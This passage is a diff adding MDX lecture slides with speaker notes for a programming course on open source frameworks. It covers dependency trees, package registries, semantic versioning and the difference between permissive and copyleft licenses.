@@ -1,0 +1,1746 @@
+---
+sidebar_position: 23
+title: "Open Source Frameworks"
+image: /img/lectures/web/l23.png
+---
+
+import RevealJS, { Slide } from '@site/src/components/RevealJS';
+import Img from '@site/src/components/Img';
+
+<RevealJS transition="slide">
+
+{/* ============================================ */}
+{/* COVER IMAGE */}
+{/* ============================================ */}
+
+<Slide>
+  <Img
+    src="/img/lectures/web/l23.png"
+    prompt="Concept: 'Open Source Frameworks' (Program Design & Implementation 2). A pixel art educational illustration depicting a global open-source bazaar marketplace. In the center, a vibrant marketplace with stalls and booths, each labeled with famous OSS projects: Linux, Jackson, Spring, React, TensorFlow. Developers from around the world collaborate, contributing packages TO the marketplace and taking packages FROM it. Above the marketplace, commercial skyscrapers (labeled Netflix, Amazon, Google, Microsoft) are supported by the open-source foundation below them. The visual metaphor: the commercial world stands on open-source shoulders. Package boxes flow in both directions. A globe in the background shows worldwide connections. Tagline: 'Modern Software Stands on Open Source Shoulders'. Retro pixel art style with teals, blues, purples, and warm accents."
+    alt="A pixel art illustration of a global open-source marketplace. Developers worldwide collaborate, contributing to and taking from stalls labeled Linux, Jackson, Spring, React. Commercial buildings above are supported by the OSS foundation. Tagline: Modern Software Stands on Open Source Shoulders."
+  />
+
+<aside className="notes">
+**Lecture overview:**
+- **Total time:** ~40 minutes
+- **Prerequisites:** L17 (dependency injection), L18-L19 (architectural thinking)
+- **Connects to:** L24 (security), future lectures on supply chain and teams
+
+**Structure:**
+- Component Reuse & OSS Ecosystems (~15 min)
+- Licensing: Copyleft vs. Permissive (~10 min)
+- Evaluating Dependencies (~15 min)
+
+**Key theme:** Modern software is built on open source foundations. Understanding how to evaluate, adopt, and manage dependencies is a critical professional skill.
+
+→ **Transition:** Let's start with the title...
+</aside>
+
+</Slide>
+
+{/* ============================================ */}
+{/* TITLE SLIDE */}
+{/* ============================================ */}
+
+<Slide>
+
+# CS 3100: Program Design and Implementation II
+
+## Lecture 23: Open Source Frameworks
+
+<p style={{marginTop: '2em', fontSize: '0.8em', color: '#666'}}>
+  ©2026 Jonathan Bell, CC-BY-SA
+</p>
+
+<aside className="notes">
+**Context:**
+- We've been building systems with components wired together (L17-L19)
+- Today: where do those components come from? How do we evaluate them?
+- Running theme: modern software is not written from scratch
+
+**Key message:** "Your code depends on thousands of developers you've never met. Today we learn how to be a responsible participant in that ecosystem."
+
+→ **Transition:** Here's what you'll be able to do after today...
+</aside>
+
+</Slide>
+
+{/* ============================================ */}
+{/* LEARNING OBJECTIVES */}
+{/* ============================================ */}
+
+<Slide>
+
+## Learning Objectives
+
+<p style={{fontSize: '0.85em', textAlign: 'left'}}>
+After this lecture, you will be able to:
+</p>
+
+<ol style={{fontSize: '0.75em', textAlign: 'left'}}>
+  <li>Explain how <strong>component reuse</strong> simplifies software development and the role of OSS ecosystems in distributing reusable components</li>
+  <li>Describe the role and impact of <strong>copyleft licenses</strong> on OSS</li>
+  <li>Describe <strong>tradeoffs</strong> that should be considered when adopting a library or framework</li>
+  <li>Evaluate a dependency's <strong>community health</strong>, governance model, and long-term viability</li>
+</ol>
+
+<aside className="notes">
+**Time allocation:**
+- Objective 1: Component Reuse (~15 min)
+- Objective 2: Licensing (~10 min)
+- Objectives 3-4: Evaluating Dependencies (~15 min)
+
+**Connection to prior lectures:**
+- L17: We injected dependencies — but where do they come from?
+- L18-19: We drew service boundaries — but many components are open source libraries
+
+→ **Transition:** Let's start with a simple example...
+</aside>
+
+</Slide>
+
+{/* ============================================ */}
+{/* ARC 1: COMPONENT REUSE AND OSS ECOSYSTEMS */}
+{/* ============================================ */}
+
+<Slide>
+
+## One Line of Code...
+
+<p style={{fontSize: '0.85em'}}>
+Modern software is not written from scratch. Consider adding JSON support to your project:
+</p>
+
+<div style={{fontSize: '0.7em', marginTop: '1em'}}>
+
+```gradle
+// build.gradle
+dependencies {
+    implementation 'com.fasterxml.jackson.core:jackson-databind:2.15.0'
+}
+```
+
+</div>
+
+<div className="fragment" style={{marginTop: '1.5em'}}>
+
+```mermaid
+graph TD
+    App["Your Application"] --> Jackson["jackson-databind:2.15.0"]
+    Jackson --> Annotations["jackson-annotations:2.15.0"]
+    Jackson --> Core["jackson-core:2.15.0"]
+```
+
+</div>
+
+<div className="fragment">
+<p style={{fontSize: '0.82em', marginTop: '1em', color: '#9370DB'}}>
+Three JARs for one "dependency." But this is just the beginning...
+</p>
+</div>
+
+<aside className="notes">
+**Start simple:**
+- One line in build.gradle brings in Jackson
+- Run `gradle dependencies` and you see the tree
+- Three JARs for one "dependency"
+
+**Set up the reveal:**
+- "But this is just the beginning..."
+- We're about to show them how deep the rabbit hole goes
+
+→ **Transition:** What if we want the full Jackson ecosystem?
+</aside>
+
+</Slide>
+
+<Slide>
+
+## ...But Real Apps Need More
+
+<p style={{fontSize: '0.85em'}}>
+Most apps need Java 8 date/time support and <code>Optional</code> handling. Add two more modules:
+</p>
+
+<div style={{fontSize: '0.55em', marginTop: '0.5em'}}>
+
+```mermaid
+graph TD
+    App["Your Application"] --> Databind["jackson-databind:2.15.0"]
+    App --> JSR310["jackson-datatype-jsr310:2.15.0"]
+    App --> JDK8["jackson-datatype-jdk8:2.15.0"]
+    
+    Databind --> Core["jackson-core:2.15.0"]
+    Databind --> Annotations["jackson-annotations:2.15.0"]
+    
+    JSR310 --> Databind
+    JDK8 --> Databind
+```
+
+</div>
+
+<div className="fragment">
+<p style={{fontSize: '0.78em', marginTop: '0.5em'}}>
+Notice the <strong>diamond dependencies</strong> — multiple paths to jackson-databind. Maven/Gradle resolves these, but version conflicts can cause subtle bugs.
+</p>
+</div>
+
+<aside className="notes">
+**Expanding complexity:**
+- Full Jackson usage typically includes date/time support (jsr310), Optional handling (jdk8)
+- Each module depends on the core — creating diamond dependencies
+- Maven/Gradle deduplicates, but version mismatches can cause runtime errors
+
+**The diamond problem:**
+- If jackson-datatype-jsr310 wants databind 2.14.0 but you declared 2.15.0...
+- Build tool picks one (usually newest), but this can break assumptions
+- "It worked on my machine" often traces back to dependency version differences
+
+→ **Transition:** What if you need XML and YAML support too?
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Third-Party Dependencies Appear
+
+<p style={{fontSize: '0.85em'}}>
+Add XML and YAML format support — now <strong>third-party libraries</strong> enter the picture:
+</p>
+
+<div style={{fontSize: '0.48em', marginTop: '0.5em'}}>
+
+```mermaid
+graph TD
+    App["Your Application"] --> Databind["jackson-databind:2.15.0"]
+    App --> JSR310["jackson-datatype-jsr310:2.15.0"]
+    App --> JDK8["jackson-datatype-jdk8:2.15.0"]
+    App --> XML["jackson-dataformat-xml:2.15.0"]
+    App --> YAML["jackson-dataformat-yaml:2.15.0"]
+    
+    Databind --> Core["jackson-core:2.15.0"]
+    Databind --> Annotations["jackson-annotations:2.15.0"]
+    
+    JSR310 --> Databind
+    JDK8 --> Databind
+    XML --> Databind
+    YAML --> Databind
+    
+    XML --> Stax2["stax2-api:4.2.1<br/>(org.codehaus.woodstox)"]
+    XML --> Woodstox["woodstox-core:6.5.1<br/>(com.fasterxml.woodstox)"]
+    
+    YAML --> SnakeYAML["snakeyaml:2.0<br/>(org.yaml)"]
+```
+
+</div>
+
+<div className="fragment">
+<p style={{fontSize: '0.75em', marginTop: '0.5em', color: '#FF9800'}}>
+<strong>Three different organizations</strong> now contribute to your project: FasterXML (Jackson), Codehaus (Stax2), and org.yaml (SnakeYAML).
+</p>
+</div>
+
+<aside className="notes">
+**The third-party explosion:**
+- Jackson XML support needs a Stax XML parser
+- Woodstox is a popular Stax implementation — maintained by FasterXML but separate project
+- stax2-api is from Codehaus — a DIFFERENT organization
+- SnakeYAML is from org.yaml — yet another organization
+
+**Real output from `mvn dependency:tree`:**
+```
+jackson-dataformat-xml:2.15.0
+├── stax2-api:4.2.1 (org.codehaus.woodstox)
+└── woodstox-core:6.5.1 (com.fasterxml.woodstox)
+jackson-dataformat-yaml:2.15.0
+└── snakeyaml:2.0 (org.yaml)
+```
+
+→ **Transition:** Let's count what we've accumulated...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Thousands of Shoulders
+
+<p style={{fontSize: '0.85em'}}>
+Five lines in your build file. <strong>Ten JAR files</strong> from <strong>four organizations</strong>.
+</p>
+
+<div style={{fontSize: '0.58em', marginTop: '0.75em', padding: '0.75em', backgroundColor: 'rgba(147, 112, 219, 0.1)', borderRadius: '8px'}}>
+
+```
+$ mvn dependency:tree
+com.example:jackson-deps:jar:1.0-SNAPSHOT
+├── jackson-databind:2.15.0
+│   ├── jackson-annotations:2.15.0
+│   └── jackson-core:2.15.0
+├── jackson-datatype-jsr310:2.15.0
+├── jackson-datatype-jdk8:2.15.0
+├── jackson-dataformat-xml:2.15.0
+│   ├── stax2-api:4.2.1           ← org.codehaus.woodstox
+│   └── woodstox-core:6.5.1       ← com.fasterxml.woodstox
+└── jackson-dataformat-yaml:2.15.0
+    └── snakeyaml:2.0             ← org.yaml
+```
+
+</div>
+
+<div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1em', marginTop: '1em', fontSize: '0.7em'}}>
+
+<div style={{padding: '0.75em', border: '2px solid #4CAF50', borderRadius: '8px'}}>
+
+**What you wrote:**
+- 5 dependency declarations
+- ~20 lines of Java
+
+</div>
+
+<div style={{padding: '0.75em', border: '2px solid #9370DB', borderRadius: '8px'}}>
+
+**What you're running:**
+- 10 JAR files
+- 4 different organizations
+- Dozens of maintainers
+
+</div>
+
+</div>
+
+<div className="fragment">
+<p style={{fontSize: '0.82em', marginTop: '1em', fontWeight: 'bold', color: '#FF9800'}}>
+Your JSON/XML/YAML handling stands on the shoulders of developers you've never met, at organizations you may not have heard of.
+</p>
+</div>
+
+<aside className="notes">
+**The numbers are real:**
+- Run `mvn dependency:tree` on any Java project
+- You'll see transitive dependencies from organizations you've never heard of
+- Each one maintained by someone, somewhere
+
+**The key insight:**
+- You didn't write any of this code
+- You're trusting maintainers at four different organizations
+- SnakeYAML is maintained by ONE person (Andrey Somov)
+- What happens if he stops maintaining it?
+
+**Bridge to next section:**
+- Who ARE these developers?
+- Why do they give away their code?
+- This leads us to the economics of open source...
+
+→ **Transition:** This leads to a key insight about infrastructure...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Infrastructure Code Gravitates Toward Open Source
+
+<p style={{fontSize: '0.85em'}}>
+Your competitive advantage isn't your JSON parser — it's your recommendation algorithm, your UX, your content.
+</p>
+
+<div style={{fontSize: '0.7em', marginTop: '1em'}}>
+
+| Layer | Examples | Who Builds It |
+|-------|----------|---------------|
+| **Differentiation** | Recommendation algorithms, UX, business logic | You (proprietary) |
+| **Infrastructure** | JSON parsing, web servers, encryption, databases | Industry (open source) |
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em'}}>
+<p style={{fontSize: '0.8em'}}>
+Why would Netflix, Spotify, and Airbnb each employ engineers to independently build the same JSON parser? It makes far more sense to:
+</p>
+<ol style={{fontSize: '0.7em'}}>
+  <li>Share the cost of development across the industry</li>
+  <li>Benefit from bug fixes and security patches contributed by everyone</li>
+  <li>Focus proprietary effort on what actually differentiates your product</li>
+</ol>
+</div>
+
+<aside className="notes">
+**The economic argument:**
+- Infrastructure is a shared problem with a shared solution
+- IBM committed over $1 billion to Linux development
+- Microsoft — once calling Linux "communism" — now runs it across Azure and acquired GitHub
+
+**Companies contribute to open source because it's cheaper than going it alone.**
+
+**Historical note (if time):**
+- The 1956 AT&T consent decree prevented them from selling Unix
+- Bell Labs shared it freely with researchers — accidental open source!
+
+→ **Transition:** This collaborative model has a name...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## The Cathedral and the Bazaar
+
+<Img
+  src="/img/lectures/web/l23-cathedral-bazaar.webp"
+  prompt="A split-scene educational illustration comparing two software development models. No title.
+
+LEFT SIDE — THE CATHEDRAL: A grand, closed cathedral building with tall spires. Inside (shown through a cutaway), a small group of robed developers work in isolation at drafting tables. Heavy wooden doors are closed. A sign says 'Version 2.0 Coming... Eventually.' The atmosphere is quiet, controlled, perfectionist. A calendar on the wall shows years between releases.
+
+RIGHT SIDE — THE BAZAAR: A bustling open-air marketplace with colorful tents and stalls. Developers from around the world (diverse appearances) are actively trading code, filing issues on chalkboards, submitting pull requests. Users are testing software right at the stalls and giving immediate feedback. Signs show 'v0.1.1', 'v0.1.2', 'v0.1.3' — frequent releases. GitHub's Octocat mascot is visible somewhere in the crowd.
+
+CENTER: A road connecting the two, with a developer walking from the cathedral toward the bazaar, looking curious.
+
+BOTTOM: Two labeled boxes summarizing each model.
+
+Style: Warm, educational illustration with clear visual contrast between the closed cathedral and open bazaar."
+  alt="Split illustration: Left shows a closed cathedral with small team working in isolation. Right shows a bustling bazaar marketplace with diverse developers trading code, filing issues, rapid releases. A developer walks from cathedral toward bazaar."
+/>
+
+<aside className="notes">
+**Eric S. Raymond's 1997 essay:**
+- **Cathedral:** Small group works in isolation, polished releases infrequently. Traditional proprietary software.
+- **Bazaar:** Development in the open, frequent releases, users as co-developers, democratic governance.
+
+**The bazaar model powers most successful OSS today:**
+- Release early and often to get feedback
+- Treat users as co-developers
+- Modularize and reuse components
+
+**GitHub is the modern bazaar:**
+- Developer in Tokyo publishes Monday
+- By Friday: teams in São Paulo, Berlin, Boston are using it, filing issues, submitting PRs
+- This global collaboration was unimaginable when software shipped on CDs
+
+→ **Transition:** And this model won...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Open Source Won the Platform Wars
+
+<Img
+  src="/img/lectures/web/l23-oss-won2.webp"
+  prompt="An educational timeline illustration showing how open source won the browser wars. No title.
+
+TOP: A timeline from 1995 to today, showing the rise and fall of proprietary browsers.
+
+1995-1998: Internet Explorer (shown as a menacing warship with Microsoft logo) attacks and sinks Netscape (a smaller ship going down). The warship flies a battle flag reading 'Embrace, Extend, Extinguish'. IE dominates with 95% market share. BUT: as Netscape sinks, a life raft labeled 'Mozilla' escapes carrying the source code.
+
+2004: Mozilla Firefox emerges (a phoenix rising from the water where Netscape sank)
+
+2003: Apple fires a cannonball labeled 'WebKit' at the IE warship. Safari launches with WebKit engine (open source, forked from KHTML) — Apple bets on open source instead of licensing IE.
+
+2008: Chrome launches with Chromium engine (open source, initially based on WebKit).
+
+2015: IE is shown rusting and abandoned. Microsoft launches Edge with proprietary EdgeHTML engine.
+
+2019: Microsoft Edge crosses out 'EdgeHTML' and writes 'Chromium' — the former browser killer now runs on open source.
+
+TODAY: Three browser logos (Chrome, Safari, Edge) all connected by lines to a central 'Open Source Core' hub. The hub glows. IE's rusted hulk sits in the background, abandoned.
+
+CALLOUT: 'IE won the battle. Open source won the war.'
+
+Style: Clean educational timeline with warm colors, showing IE's rise and fall, and the ultimate convergence toward open source."
+  alt="Timeline: IE (1995) kills Netscape, but Mozilla escapes with source code. Firefox rises (2004). Chrome/Safari launch with open source engines. Edge abandons proprietary engine for Chromium (2019). IE rusts abandoned. Callout: IE won the battle, open source won the war."
+/>
+
+<aside className="notes">
+**The browser story:**
+- 1998: Netscape, facing extinction from IE, open-sourced their browser as Mozilla
+- Netscape the company died, Firefox eventually lost market share
+- But look at today: Chrome (Chromium), Safari (WebKit), Edge (Chromium) — ALL open source cores
+
+**The pattern repeats across the industry:**
+- Linux runs Android, AWS, most web servers
+- SQLite is in every iPhone, Android device, browser
+- Jackson, Spring, JUnit power most Java enterprise software
+- React, TensorFlow, PyTorch — all open source foundations
+
+**Many projects maintained by surprisingly small teams — yet support billions in commercial software.**
+
+→ **Transition:** How does all this code get distributed?
+</aside>
+
+</Slide>
+
+<Slide>
+
+## The Ecosystem: Package Registries
+
+<p style={{fontSize: '0.85em'}}>
+Open source ecosystems depend on <strong>package registries</strong> to distribute reusable components:
+</p>
+
+<div style={{fontSize: '0.7em', marginTop: '1em'}}>
+
+| Registry | Ecosystem | Examples |
+|----------|-----------|----------|
+| **Maven Central** | Java/JVM | JUnit, Spring, Jackson |
+| **npm** | JavaScript | React, Express, lodash |
+| **PyPI** | Python | pandas, tensorflow, requests |
+| **crates.io** | Rust | serde, tokio |
+| **NuGet** | .NET | Newtonsoft.Json, Entity Framework |
+
+</div>
+
+<div className="fragment">
+<p style={{fontSize: '0.82em', marginTop: '1em', color: '#9370DB'}}>
+These registries make it trivial to declare a dependency and have it automatically downloaded — along with all of its transitive dependencies.
+</p>
+</div>
+
+<aside className="notes">
+**Each ecosystem has its registry:**
+- Maven Central for Java — you've been using this with Gradle
+- npm for JavaScript — 2+ million packages
+- PyPI for Python — the `pip install` command
+
+**The magic:**
+- Declare what you need
+- Build tool downloads it automatically
+- Transitive dependencies resolved for you
+
+→ **Transition:** But libraries evolve. How do we know if an update will break our code?
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Semantic Versioning Encodes Promises
+
+<p style={{fontSize: '0.85em'}}>
+Libraries evolve. <strong>Semantic Versioning</strong> (SemVer) encodes compatibility promises in version numbers:
+</p>
+
+<div style={{fontSize: '0.8em', textAlign: 'center', marginTop: '1em', padding: '0.75em', backgroundColor: 'rgba(147, 112, 219, 0.1)', borderRadius: '8px'}}>
+
+**MAJOR . MINOR . PATCH**
+
+**2 . 15 . 0**
+
+</div>
+
+<div style={{fontSize: '0.72em', marginTop: '1em'}}>
+
+| Change | Example | Meaning | Safe to Update? |
+|--------|---------|---------|-----------------|
+| **PATCH** | 2.15.0 → 2.15.1 | Bug fixes only | ✅ Yes |
+| **MINOR** | 2.15.0 → 2.16.0 | New features, backwards compatible | ✅ Usually |
+| **MAJOR** | 2.15.0 → 3.0.0 | Breaking changes | ⚠️ Review needed |
+
+</div>
+
+<div className="fragment" style={{fontSize: '0.65em', marginTop: '1em'}}>
+
+```gradle
+// Exact version — reproducible but requires manual updates
+implementation 'com.fasterxml.jackson.core:jackson-databind:2.15.0'
+
+// Any 2.x version — automatic patches but risk of breakage
+implementation 'com.fasterxml.jackson.core:jackson-databind:2.+'
+```
+
+</div>
+
+<aside className="notes">
+**The tradeoff:**
+- Strict versions: reproducible builds, but you must manually update
+- Flexible ranges: automatic security patches, but risk unexpected breakage
+
+**Real-world complications:**
+- Not everyone follows SemVer perfectly
+- "Breaking change" is sometimes subjective
+- Hyrum's Law: "With sufficient users, every observable behavior becomes a dependency"
+
+→ **Transition:** This ecosystem brings enormous benefits — and risks...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## The Double-Edged Sword of Dependency
+
+<div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '1.5em', marginTop: '1em', fontSize: '0.75em'}}>
+
+<div style={{padding: '1em', border: '2px solid #4CAF50', borderRadius: '8px'}}>
+
+**Benefits**
+
+- **Speed:** Don't reinvent the wheel; use battle-tested solutions
+- **Quality:** Popular libraries debugged by millions of users
+- **Security:** Vulnerabilities found and patched quickly (when maintained)
+
+</div>
+
+<div style={{padding: '1em', border: '2px solid #FF9800', borderRadius: '8px'}}>
+
+**Risks**
+
+- **Supply chain attacks:** Compromised dependency compromises your app
+- **Abandonment:** What happens when a maintainer stops updating?
+- **License compatibility:** Can you legally use this code?
+
+</div>
+
+</div>
+
+<div className="fragment">
+<p style={{fontSize: '0.85em', marginTop: '1.5em', fontWeight: 'bold', color: '#9370DB'}}>
+We'll explore the risks — licensing and evaluation — in the rest of this lecture.
+</p>
+</div>
+
+<aside className="notes">
+**The benefits are real:**
+- Jackson is better than anything you'd write for JSON
+- Spring Security is better than rolling your own auth
+- TensorFlow is better than implementing neural nets from scratch
+
+**But the risks are real too:**
+- left-pad: 11-line npm package deleted, broke thousands of builds
+- Log4Shell: critical vulnerability in ubiquitous logging library
+- License surprises: GPL code in your proprietary product
+
+**These risks are manageable — if you're aware of them.**
+
+→ **Transition:** Let's start with licensing...
+</aside>
+
+</Slide>
+
+{/* ============================================ */}
+{/* ARC 2: LICENSING */}
+{/* ============================================ */}
+
+<Slide>
+
+## Every Line of Code Is Copyrighted by Default
+
+<p style={{fontSize: '0.85em'}}>
+To understand open source licensing, we first need to understand <strong>copyright</strong>.
+</p>
+
+<div style={{fontSize: '0.75em', marginTop: '1em'}}>
+
+**Copyright** is automatic. The moment you write code, you own exclusive rights to:
+- **Copy** the work
+- **Modify** it (create "derivative works")
+- **Distribute** copies to others
+- **Display** or perform it publicly
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', padding: '0.75em', border: '2px solid #FF9800', borderRadius: '8px', fontSize: '0.8em'}}>
+
+**Key insight:** A GitHub repo with no `LICENSE` file means "all rights reserved."
+
+You legally **cannot** use it — even if the author clearly intended to share it.
+
+</div>
+
+<aside className="notes">
+**Copyright is the foundation:**
+- You don't need to register — it's automatic
+- Without explicit permission, the default is "you can't use this"
+- This is why licenses exist: to grant specific permissions
+
+**Common misconception:**
+- "It's on GitHub, so I can use it" — NO!
+- "The author meant to share it" — doesn't matter legally
+- Always check for a LICENSE file
+
+→ **Transition:** Licenses grant permissions — but with different conditions...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## From BSD to GPL: A Values Fork
+
+<p style={{fontSize: '0.85em'}}>
+The two licensing philosophies grew from the <strong>same code lineage</strong> — but diverged on a fundamental question about freedom.
+</p>
+
+<div style={{fontSize: '0.75em', marginTop: '1em'}}>
+
+| Year | Event | Philosophy |
+|------|-------|------------|
+| **1969** | Bell Labs shares Unix freely (AT&T consent decree prevents selling it) | Accidental openness |
+| **1977** | Berkeley builds on Unix, creates BSD license: "Do whatever you want, just credit us" | **Maximum individual freedom** |
+| **1983** | Stallman sees companies closing BSD-derived source code. Launches GNU and GPL: "Share alike, forever" | **Protect the commons** |
+
+</div>
+
+<div className="fragment" style={{marginTop: '1em', fontSize: '0.75em'}}>
+
+**Both philosophies shaped the modern world:**
+
+| BSD lineage (permissive) | GPL lineage (copyleft) |
+|--------------------------|------------------------|
+| FreeBSD → **macOS, iOS** | GNU/Linux → **Android, Cloud** |
+| Companies took the code and closed it — *as intended* | Companies must share kernel changes — *as intended* |
+
+</div>
+
+<div className="fragment" style={{marginTop: '0.5em', padding: '0.5em', border: '2px solid #9370DB', borderRadius: '8px', fontSize: '0.78em'}}>
+
+**The irony:** BSD's freedom *enabled* companies to close the source — which is exactly what motivated Stallman to create a license that *prevented* it. Same code heritage, fundamentally different values.
+
+</div>
+
+<aside className="notes">
+**The historical arc:**
+- Unix was shared freely because AT&T legally couldn't sell it (1956 DOJ antitrust consent decree)
+- Berkeley researchers built on it, created BSD — their license reflected academic culture: share freely, credit the university
+- Companies took BSD code, made proprietary products, and never shared back
+- Stallman saw this and said: "This defeats the purpose. If code can be closed, the commons erodes."
+- GPL was his answer: you can use it, but you must share your modifications
+
+**The naming is intentional:** GNU = "GNU's Not Unix!" — Stallman's explicit break from Unix's model
+
+**Bridge to next slide:** Both philosophies produced enormously successful projects. Let's see what they look like in practice...
+
+→ **Transition:** These two philosophies still shape every licensing decision today...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Two Philosophies: Maximize Adoption vs. Protect the Commons
+
+<Img
+  src="/img/lectures/web/l23-license-workshop.webp"
+  prompt="An educational illustration showing two maker spaces in a shared warehouse, representing two open-source licensing philosophies. No title.
+
+LEFT BENCH — PERMISSIVE (labeled 'BSD / MIT / Apache'):
+A casual, welcoming workbench with tools and blueprints freely available. A person takes a blueprint from the shared rack, builds a product, and carries it through a door labeled 'Proprietary Product' that closes behind them. No one objects — that's allowed here. A small sign reads: 'Use it however you want. Just don't blame us.' The bench is busy with diverse makers building different things.
+
+RIGHT BENCH — COPYLEFT (labeled 'GPL'):
+A well-organized workbench with four workshop rules prominently posted on the wall like shop safety rules:
+Rule 0: 'Use any tool for any project'
+Rule 1: 'Take apart any machine to learn how it works'
+Rule 2: 'Make copies of blueprints for friends'
+Rule 3: 'Share your improved designs'
+A prominent sign reads: 'Free as in free speech, not as in free beer.'
+A figure resembling Richard Stallman (long hair, full beard, casual clothing) stands near the sign, gesturing toward the rules proudly. Anything built from shared blueprints must keep its blueprints public — a maker pins their improved blueprint back on the shared rack.
+
+BOTH benches are busy, productive, and full of happy makers building cool things. Neither side is portrayed negatively.
+
+BOTTOM: A small note: 'Different rules, same workshop. Neither is wrong.'
+
+Style: Warm educational illustration, clear visual contrast between the two benches, no judgment about which is better. Clean, readable text on signs and rules."
+  alt="Two maker spaces in a shared warehouse. Left bench (BSD/MIT): blueprints freely available, someone takes one into a closed Proprietary Product door. Right bench (GPL): four workshop rules posted (use any tool, take apart machines, copy blueprints, share improvements) with a sign reading 'Free as in free speech, not as in free beer' and a Stallman-like figure gesturing proudly. Both benches are busy and productive."
+/>
+
+<aside className="notes">
+**The BSD/MIT philosophy:**
+- Maximum freedom for individual users
+- Even the freedom to close the source
+- "Do whatever you want, just don't blame us"
+
+**The GPL philosophy (Stallman, 1983):**
+- Software should be "free as in speech, not as in beer"
+- Four freedoms: run, study, redistribute, distribute modified versions
+- Copyleft: if you distribute, you must share your source too
+
+**The key insight:**
+- This is a VALUES choice embedded in code
+- When you choose a license — or adopt a dependency — you're making a statement
+- Neither is objectively "correct"
+
+→ **Transition:** Let's see the practical differences...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Permissive vs. Copyleft: Quick Reference
+
+<div style={{fontSize: '0.75em', marginTop: '1em'}}>
+
+| Question | Permissive (MIT, Apache, BSD) | Copyleft (GPL, LGPL, AGPL) |
+|----------|-------------------------------|----------------------------|
+| **Can I use it in proprietary software?** | Yes | Usually requires open-sourcing your code |
+| **Must I share my modifications?** | No | Yes, if you distribute |
+| **Philosophy** | Maximize adoption | Protect the commons |
+| **Popular examples** | React, Jackson, Spring | Linux kernel, GCC, WordPress |
+
+</div>
+
+<div className="fragment" style={{marginTop: '1.5em'}}>
+<p style={{fontSize: '0.8em'}}>
+<strong>Most popular libraries use permissive licenses:</strong> React (MIT), Jackson (Apache 2.0), Spring (Apache 2.0), TensorFlow (Apache 2.0)
+</p>
+<p style={{fontSize: '0.8em', marginTop: '0.5em'}}>
+<strong>GPL powers critical infrastructure:</strong> Linux kernel, many Linux utilities (maintained by GNU), forces community participation
+</p>
+</div>
+
+<aside className="notes">
+**Why permissive licenses dominate libraries:**
+- Companies can adopt without legal review
+- Startups can use without worrying about open-sourcing
+- Maximizes adoption → maximizes maintainers
+
+**Why GPL for operating systems:**
+- Ensures the commons stays open
+- Companies CAN'T embrace-extend-extinguish
+- Linux wouldn't be what it is without GPL protection
+
+**The SaaS loophole:**
+- GPL requires sharing if you DISTRIBUTE
+- Running software as a service isn't "distribution"
+- This is why MongoDB moved to SSPL — to close that loophole
+
+→ **Transition:** Practical guidance...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Practical Licensing Guidance
+
+<p style={{fontSize: '0.85em'}}>
+For most developers using open source libraries:
+</p>
+
+<ol style={{fontSize: '0.78em', marginTop: '1em'}}>
+  <li><strong>Check the license</strong> before adding a dependency. It's usually in a <code>LICENSE</code> file or package metadata.</li>
+  <li><strong>Permissive licenses are low-risk</strong> for most commercial projects.</li>
+  <li><strong>GPL requires careful attention</strong> if you're building proprietary software — consult your legal team.</li>
+</ol>
+
+
+<aside className="notes">
+**The philosophical debate continues:**
+- Should open source FORCE participation in the commons?
+- Or ENCOURAGE it through permissive terms?
+- No single right answer — both have produced wildly successful projects
+
+**Modern complications:**
+- SaaS loophole: Amazon runs MongoDB without sharing code
+- Companies changing licenses mid-stream (we'll discuss this)
+- "Source available" vs "open source" distinction
+
+→ **Transition:** Some projects get creative with licenses...
+</aside>
+
+</Slide>
+
+<Slide>
+
+## Licenses as Values: The Unusual Cases
+
+<div style={{position: 'relative', width: '100%'}}>
+  <Img
+    src="/img/lectures/web/l23-license-values.webp"
+    prompt="An educational illustration showing three unusual software licenses as equal-width panels arranged horizontally in a single row. No title. Clean and simple layout. Each panel takes exactly one-third of the width.
+
+LEFT PANEL — SQLITE'S PUBLIC DOMAIN BLESSING (purple tones):
+A scroll unfurls with the SQLite blessing text: 'May you do good and not evil. May you find forgiveness for yourself and forgive others. May you share freely, never taking more than you give.' Below the scroll, a nervous corporate lawyer holds a document labeled 'Warranty of Title — $$$' — for companies who need legal certainty that public domain will hold up in court.
+
+MIDDLE PANEL — JSLINT'S 'GOOD NOT EVIL' (orange tones):
+Older man with glasses winks and stands next to the JSLint license text: 'The Software shall be used for Good, not Evil.' A corporate lawyer sweats and points at the word 'Evil' with question marks. In the corner, a group of suited figures labeled 'IBM, its customers, partners, and minions' hold a golden scroll that says 'Licensed for Evil.' Among them, a small cartoonish yellow minion character waves happily.
+
+RIGHT PANEL — MONGODB'S LICENSE TENSION (gray/blue tones):
+Two groups face off across a table. On one side, cloud providers (labeled AWS, Azure) run MongoDB as a service and profit without contributing back. On the other side, MongoDB Inc. slams down a document labeled 'SSPL: Offer it as a service? Open-source your ENTIRE stack.' Between them on the table, a central question in bold: 'Open Source? or Source Available?' Neither side looks satisfied — the tension is unresolved.
+
+BOTTOM CALLOUT (spanning full width): 'Licensing is never purely technical — it reflects what kind of software ecosystem you believe should exist.'
+
+Style: Warm, clean editorial illustration. Three equal-width panels with clear vertical separation lines between them. Bottom callout is visually distinct below all three panels. Humorous but educational. Simple backgrounds, focus on the characters and text."
+    alt="Three panels: (1) SQLite's public domain blessing on a scroll with a lawyer holding a Warranty of Title document, (2) JSLint's 'Good not Evil' license clause with a sweating lawyer and IBM's minions holding a golden 'Licensed for Evil' scroll, Crockford winking, (3) MongoDB's license tension with cloud providers facing off against SSPL requirements and the question: Open Source or Source Available?"
+  />
+  {/* Mask over middle + right panels + callout — fades out to reveal middle panel */}
+  <div className="fragment fade-out" data-fragment-index="1" style={{position: 'absolute', top: 0, left: '31%', width: '70%', height: '85%', backgroundColor: 'white', zIndex: 2}} />
+  {/* Mask over right panel + callout — fades out to reveal right panel and callout together */}
